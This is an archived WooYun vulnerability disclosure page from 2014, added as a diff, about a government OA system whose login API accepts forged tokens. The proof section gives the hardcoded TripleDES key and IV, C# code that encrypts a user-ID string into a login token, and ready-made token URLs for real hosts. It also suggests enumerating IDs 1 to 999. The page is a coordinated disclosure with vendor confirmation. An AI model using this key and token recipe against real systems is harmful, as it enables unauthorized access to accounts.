@@ -1,0 +1,229 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		某多家政府在用OA可伪造任意用户身份登录系统  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		某多家政府在用OA可伪造任意用户身份登录系统  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/wefgod">wefgod</a> 
+</li><li>提交时间：		2014-01-27 17:15</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-27：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-02-01：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-02-04：	细节向第三方安全合作伙伴开放<br/>
+									2014-02-11：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-02-21：	细节向普通白帽子公开<br/>
+									2014-03-13：	细节向实习白帽子公开<br/>
+									2014-04-27：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">直接伪造好数据就自动登录并分配cookie给你了</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">使用API接口无需用户密码就可以直接登录系统了。<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">http://www.dyjwoa.com/AuthReturn.aspx?APTokenResponse=a$8SOIYyiGVYBge5mdoY5nIeAueY7BixUtLdHqpy8o3RqM9hVnisaXAA==<br />
+<br />
+</p><p class="detail"><a href="../images/2713074294af4c08cda1bf20b3746c1bb79ee3e3.png" target="_blank"><img src="../images/2713074294af4c08cda1bf20b3746c1bb79ee3e3.png" alt="image031.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+其实很简单，上面的Token组成最主要是用户的ID号（加密的数据，后面说）就可以无需密码登录成功，如果担心获取不到ID号，可以直接程序从1加密到999，必定会有一部分ID号是有对应用户的，这个不是问题，很简单。<br />
+<br />
+用.NET来做示例，以下是加密算法：<br />
+<br />
+</p><pre><code>static string tripleDESEncrypt(string inputString)<br />
+<br />
+        {<br />
+<br />
+            TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();<br />
+<br />
+            byte[] array = Encoding.UTF8.GetBytes(inputString);<br />
+<br />
+            tripleDESCryptoServiceProvider.Key = GetKey(&quot;3497C134D6252F8C85E8AEA1315626EC10D7F9E404916BA3&quot;);<br />
+<br />
+            tripleDESCryptoServiceProvider.IV = GetKey(&quot;0102030405060708&quot;);<br />
+<br />
+            MemoryStream memoryStream = new MemoryStream();<br />
+<br />
+            CryptoStream cryptoStream = new CryptoStream(memoryStream, tripleDESCryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write);<br />
+<br />
+            cryptoStream.Write(array, 0, array.Length);<br />
+<br />
+            cryptoStream.FlushFinalBlock();<br />
+<br />
+            return Convert.ToBase64String(memoryStream.ToArray());<br />
+<br />
+        }</code></pre><p class='detail'><br />
+<br />
+生成参数的方法：<br />
+<br />
+string text = &quot;a$&quot; + tripleDESEncrypt(&quot;0$1$846$admin$44$88000000009$6$7$8$9&quot;);<br />
+<br />
+其中0$1$846$admin$44$88000000009$6$7$8$9，字符串里面的846可以替换为存在的任意一个ID号（不存在的也行，看返回的信息就知道了），admin字符串是用户名，没有用的只看ID号，开头的0是认证通过的参数，不可以改。其它数字随意改。<br />
+<br />
+最后上面的程序会生成a$8SOIYyiGVYBge5mdoY5nIeAueY7BixUtLdHqpy8o3RqM9hVnisaXAA==<br />
+<br />
+带入到链接的参数内即可。<br />
+<br />
+<br />
+<br />
+ <br />
+<br />
+顺便多伪造一个：<br />
+<br />
+<br />
+<br />
+http://61.160.252.80/Page/System/UserDetail.aspx?Id=7<br />
+<br />
+</p><p class="detail"><a href="../images/2713084482c8069f1d42ba3fb89d007390ddf7e4.png" target="_blank"><img src="../images/2713084482c8069f1d42ba3fb89d007390ddf7e4.png" alt="image033.png" width="600"/></a></p><p class="detail"><br />
+<br />
+http://61.160.252.80/AuthReturn.aspx?APTokenResponse=a$hJVV5VPzCvr9ZMrpBcU/obmTefSp/oGFkEfolmJU6TxJTPkB9jZqcA==<br />
+<br />
+</p><p class="detail"><a href="../images/27130917b041a3fd719ef21be4c7a037158c7396.png" target="_blank"><img src="../images/27130917b041a3fd719ef21be4c7a037158c7396.png" alt="image035.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/27130948fbd1d18de35ca6e92b506e643a4e1418.png" target="_blank"><img src="../images/27130948fbd1d18de35ca6e92b506e643a4e1418.png" alt="image037.png" width="600"/></a></p><p class="detail"><br />
+<br />
+稍加修改可能会比较完美。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">验证用户的密码或者结合实际的代码再看吧。总之不能只验证个加密的用户名就搞定了 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/wefgod" title="wefgod">wefgod</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-049930" title="某多家政府在用OA可伪造任意用户身份登录系统">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：13 </p>
+													<p class="detail">确认时间：2014-02-01 22:47</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">CNVD确认并复现所述情况，已经转由CNCERT下发给江苏分中心，由江苏分中心后续尝试联系软件生产厂商，并已经同步下发给测试得到涉及的相关江苏省政府部门。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="49930";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
